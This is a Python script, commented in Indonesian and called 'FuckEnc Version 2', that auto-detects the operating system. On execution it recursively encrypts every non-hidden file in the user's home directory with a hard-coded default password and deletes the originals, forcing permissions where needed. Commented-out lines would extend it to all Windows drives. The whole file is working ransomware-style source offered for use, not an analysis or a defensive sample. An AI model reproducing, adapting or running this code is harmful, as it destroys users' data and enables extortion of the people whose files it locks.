#!/usr/bin/env python3
"""
FuckEnc Version 2 - Auto-Encrypt
Script untuk auto-detect OS dan mengenkripsi semua file di home directory
"""

import os
import sys
import platform
import base64
import time
import shutil
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Try to import tqdm for better progress bar, fallback to custom if not available
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False


class ProgressBar:
    """Custom progress bar jika tqdm tidak tersedia"""
    def __init__(self, total: int, desc: str = "", unit: str = "file"):
        self.total = total
        self.current = 0
        self.desc = desc
        self.unit = unit
        self.start_time = time.time()
        self.last_update = 0
        self.spinner_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        self.spinner_index = 0
        self.animated_percent = 0.0
        
    def update(self, n: int = 1):
        self.current += n
        self.animated_percent = (self.current / self.total * 100) if self.total > 0 else 0
        self._display()
        
    def _display(self, force: bool = False):
        now = time.time()
        # Update lebih jarang untuk performa lebih baik (setiap 0.1 detik)
        if not force and now - self.last_update < 0.1 and self.current < self.total:
            return
        self.last_update = now
        
        spinner = self.spinner_chars[self.spinner_index % len(self.spinner_chars)]
        self.spinner_index += 1
        
        bar_length = 50
        filled = int(bar_length * self.animated_percent / 100) if self.total > 0 else 0
        
        bar_parts = []
        for i in range(bar_length):
            if i < filled:
                bar_parts.append('█')
            elif i == filled and self.animated_percent < 100:
                bar_parts.append('░')
            else:
                bar_parts.append('░')
        
        bar = ''.join(bar_parts)
        
        elapsed = now - self.start_time
        if self.current > 0:
            rate = self.current / elapsed
            eta = (self.total - self.current) / rate if rate > 0 else 0
            eta_str = f"ETA: {int(eta)}s" if eta > 0 else "ETA: --"
            speed_str = f"{rate:.1f} {self.unit}/s"
        else:
            rate = 0
            eta_str = "ETA: --"
            speed_str = "0.0 {self.unit}/s"
        
        sys.stdout.write(f'\r{spinner} {self.desc} |{bar}| {self.current}/{self.total} ({self.animated_percent:.1f}%) [{speed_str}] [{eta_str}]')
        sys.stdout.flush()
        
    def close(self):
        self.animated_percent = 100.0
        bar_length = 50
        bar = '█' * bar_length
        elapsed = time.time() - self.start_time
        speed = self.total / elapsed if elapsed > 0 else 0
        sys.stdout.write(f'\r✓ {self.desc} |{bar}| {self.current}/{self.total} (100.0%) [{speed:.1f} {self.unit}/s] [Selesai!]\n')
        sys.stdout.flush()
        
    def __enter__(self):
        return self
        
    def __exit__(self, *args):
        self.close()


class FileEncryptor:
    def __init__(self, password: str = None):
        """Initialize encryptor dengan password"""
        self.encrypted_ext = '.encrypted'
        self.password = password
        self.fernet = None
        
    def _get_key_from_password(self, password: str, salt: bytes = None) -> tuple:
        """Generate encryption key dari password menggunakan PBKDF2"""
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key, salt
    
    def _get_fernet(self, password: str = None, salt: bytes = None) -> Fernet:
        """Get atau create Fernet cipher instance"""
        if password is None:
            password = self.password
        if password is None:
            raise ValueError("Password diperlukan untuk enkripsi/dekripsi")
        
        key, salt = self._get_key_from_password(password, salt)
        return Fernet(key)
    
    def _secure_delete(self, file_path: str, passes: int = 1, fast_mode: bool = True) -> bool:
        """Hapus file secara aman dengan menimpa data beberapa kali"""
        try:
            if not os.path.exists(file_path):
                return True
            
            file_path = os.path.abspath(file_path)
            
            # Fast mode: langsung hapus tanpa overwrite (lebih cepat)
            if fast_mode:
                try:
                    os.remove(file_path)
                    if not os.path.exists(file_path):
                        return True
                except PermissionError:
                    try:
                        os.chmod(file_path, 0o777)
                        os.remove(file_path)
                        return not os.path.exists(file_path)
                    except Exception:
                        return False
            
            # Secure mode: overwrite dulu baru hapus (lebih lambat tapi lebih aman)
            file_size = os.path.getsize(file_path)
            
            # Hanya 1 pass untuk performa lebih baik (default)
            for pass_num in range(passes):
                try:
                    with open(file_path, 'r+b') as f:
                        f.seek(0)
                        remaining = file_size
                        chunk_size = 1024 * 1024  # 1MB chunks
                        while remaining > 0:
                            write_size = min(chunk_size, remaining)
                            random_data = os.urandom(write_size)
                            f.write(random_data)
                            remaining -= write_size
                        f.flush()
                        os.fsync(f.fileno())
                except Exception:
                    pass
            
            try:
                os.remove(file_path)
            except PermissionError:
                try:
                    os.chmod(file_path, 0o777)
                    os.remove(file_path)
                except Exception:
                    return False
            
            return not os.path.exists(file_path)
            
        except Exception:
            try:
                if os.path.exists(file_path):
                    os.chmod(file_path, 0o777)
                    os.remove(file_path)
                    return not os.path.exists(file_path)
                return True
            except Exception:
                return False
    
    def encrypt_file(self, file_path: str, password: str = None, show_progress: bool = False, fast_delete: bool = True) -> bool:
        """Enkripsi single file"""
        try:
            file_path = os.path.abspath(file_path)
            if not os.path.exists(file_path):
                return False
            
            if file_path.endswith(self.encrypted_ext):
                return False
            
            salt = os.urandom(16)
            fernet = self._get_fernet(password, salt)
            
            # Baca file langsung tanpa delay
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Enkripsi data
            encrypted_data = fernet.encrypt(file_data)
            
            # Tulis file terenkripsi
            encrypted_path = file_path + self.encrypted_ext
            with open(encrypted_path, 'wb') as f:
                f.write(salt)
                f.write(encrypted_data)
            
            # Hapus file asli (fast mode untuk performa lebih baik)
            delete_success = self._secure_delete(file_path, passes=1, fast_mode=fast_delete)
            
            if os.path.exists(file_path):
                try:
                    os.chmod(file_path, 0o777)
                    os.remove(file_path)
                except Exception:
                    if os.path.exists(encrypted_path):
                        os.remove(encrypted_path)
                    return False
            
            return True
            
        except Exception:
            return False
    
    def encrypt_folder(self, folder_path: str, password: str = None, recursive: bool = True, silent: bool = False, skip_hidden: bool = True, max_workers: int = None, fast_delete: bool = True) -> int:
        """Enkripsi semua file dalam folder (rekursif termasuk semua subfolder)"""
        folder_path = os.path.abspath(folder_path)
        if not os.path.isdir(folder_path):
            return 0
        
        def is_hidden(name):
            """Cek apakah file/folder adalah hidden (diawali dengan titik)"""
            # name sudah adalah basename (nama file/folder saja)
            return name.startswith('.')
        
        # Skip jika folder_path itu sendiri adalah hidden folder
        folder_basename = os.path.basename(folder_path)
        if skip_hidden and is_hidden(folder_basename):
            return 0
        
        files_to_encrypt = []
        
        if recursive:
            for root, dirs, files in os.walk(folder_path):
                # Filter out hidden directories untuk os.walk
                # Ini penting: dengan memodifikasi dirs[:], os.walk tidak akan masuk ke folder hidden
                if skip_hidden:
                    dirs[:] = [d for d in dirs if not is_hidden(d)]
                
                for file in files:
                    # Skip file yang diawali dengan titik (hidden files)
                    if skip_hidden and is_hidden(file):
                        continue
                    
                    # Pastikan root juga bukan hidden folder
                    root_basename = os.path.basename(root)
                    if skip_hidden and is_hidden(root_basename):
                        continue
                    
                    if not file.endswith(self.encrypted_ext):
                        file_path = os.path.join(root, file)
                        if os.path.isfile(file_path):
                            files_to_encrypt.append(file_path)
        else:
            for item in os.listdir(folder_path):
                # Skip item yang diawali dengan titik (hidden files/folders)
                if skip_hidden and is_hidden(item):
                    continue
                
                file_path = os.path.join(folder_path, item)
                # Hanya proses file, bukan folder
                if os.path.isfile(file_path) and not item.endswith(self.encrypted_ext):
                    files_to_encrypt.append(file_path)
        
        if not files_to_encrypt:
            return 0
        
        # Tentukan jumlah worker (default: jumlah CPU cores atau 4, mana yang lebih kecil)
        if max_workers is None:
            try:
                max_workers = min(os.cpu_count() or 4, 8)  # Maksimal 8 workers
            except:
                max_workers = 4
        
        encrypted_count = 0
        count_lock = Lock()
        
        if not silent:
            pbar = ProgressBar(len(files_to_encrypt), desc="🔒 Enkripsi", unit="file")
        else:
            pbar = None
        
        def encrypt_single_file(file_path):
            """Helper function untuk encrypt single file"""
            try:
                if self.encrypt_file(file_path, password, show_progress=False, fast_delete=fast_delete):
                    with count_lock:
                        return 1
            except Exception:
                pass
            return 0
        
        try:
            # Gunakan ThreadPoolExecutor untuk parallel processing
            if max_workers > 1 and len(files_to_encrypt) > 10:
                # Parallel processing untuk banyak file
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    futures = {executor.submit(encrypt_single_file, file_path): file_path 
                              for file_path in files_to_encrypt}
                    
                    for future in as_completed(futures):
                        result = future.result()
                        encrypted_count += result
                        if pbar:
                            pbar.update(1)
            else:
                # Sequential processing untuk sedikit file atau single worker
                for file_path in files_to_encrypt:
                    if self.encrypt_file(file_path, password, show_progress=False, fast_delete=fast_delete):
                        encrypted_count += 1
                    if pbar:
                        pbar.update(1)
        finally:
            if pbar:
                pbar.close()
        
        return encrypted_count


def detect_os():
    """Deteksi OS yang digunakan"""
    system = platform.system().lower()
    
    os_info = {
        'system': system,
        'platform': platform.platform(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor()
    }
    
    return os_info


def get_home_directory():
    """Dapatkan home directory berdasarkan OS"""
    system = platform.system().lower()
    
    if system == 'windows':
        # Windows: C:\Users\Username
        home = os.path.expanduser("~")
        # Juga cek drive lain jika ada
        drives = []
        for drive in range(ord('C'), ord('Z') + 1):
            drive_path = f"{chr(drive)}:\\"
            if os.path.exists(drive_path):
                drives.append(drive_path)
        return home, drives
    elif system == 'darwin':
        # macOS: /Users/username
        return os.path.expanduser("~"), []
    else:
        # Linux/Unix: /home/username
        return os.path.expanduser("~"), []


def auto_encrypt_home(password: str = None, silent: bool = True, skip_hidden: bool = True, max_workers: int = None, fast_delete: bool = True):
    """Auto-encrypt semua file di home directory (hanya file yang terlihat, bukan hidden)"""
    if password is None:
        # Default password
        password = "default_password_123"
    
    # Deteksi OS
    os_info = detect_os()
    
    # Dapatkan home directory
    home_dir, additional_drives = get_home_directory()
    
    # Buat encryptor
    encryptor = FileEncryptor(password=password)
    
    encrypted_total = 0
    
    # Enkripsi home directory saja (bukan root)
    # Hanya file/folder yang terlihat (tidak diawali dengan titik)
    if os.path.exists(home_dir):
        count = encryptor.encrypt_folder(
            home_dir, 
            password=password, 
            recursive=True, 
            silent=silent,
            skip_hidden=skip_hidden,
            max_workers=max_workers,
            fast_delete=fast_delete
        )
        encrypted_total += count
    
    # TIDAK mengenkripsi drive tambahan (Windows) - hanya home directory
    # Jika ingin mengenkripsi drive tambahan juga, uncomment baris di bawah:
    # for drive in additional_drives:
    #     if os.path.exists(drive):
    #         count = encryptor.encrypt_folder(drive, password=password, recursive=True, silent=silent, skip_hidden=skip_hidden, max_workers=max_workers, fast_delete=fast_delete)
    #         encrypted_total += count
    
    return encrypted_total


def main():
    """Main function - Auto-execute saat dijalankan"""
    # Default password
    DEFAULT_PASSWORD = "default_password_123"
    
    # Deteksi OS
    os_info = detect_os()
    print(f"🖥️  OS Detected: {os_info['system'].upper()} ({os_info['platform']})")
    
    # Dapatkan home directory
    home_dir, additional_drives = get_home_directory()
    print(f"📁 Home Directory: {home_dir}")
    print(f"📋 Mode: Hanya file/folder yang terlihat (skip hidden files)")
    print(f"🔑 Password: {DEFAULT_PASSWORD}")
    print("=" * 80)
    
    # Auto-encrypt home directory
    # Gunakan silent=False untuk menampilkan progress bar
    # skip_hidden=True untuk hanya mengenkripsi file yang terlihat
    # fast_delete=True untuk performa lebih cepat (hapus langsung tanpa overwrite)
    try:
        print("🔒 Memulai enkripsi...")
        print("⚡ Mode: Fast (parallel processing + fast delete)")
        count = auto_encrypt_home(
            password=DEFAULT_PASSWORD, 
            silent=False,
            skip_hidden=True,  # Skip file/folder yang diawali dengan titik
            max_workers=None,  # Auto-detect jumlah CPU cores
            fast_delete=True   # Fast delete untuk performa lebih baik
        )
        print(f"\n✅ Enkripsi selesai! Total {count} file terenkripsi")
    except Exception as e:
        print(f"❌ Error saat enkripsi: {str(e)}")
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    main()

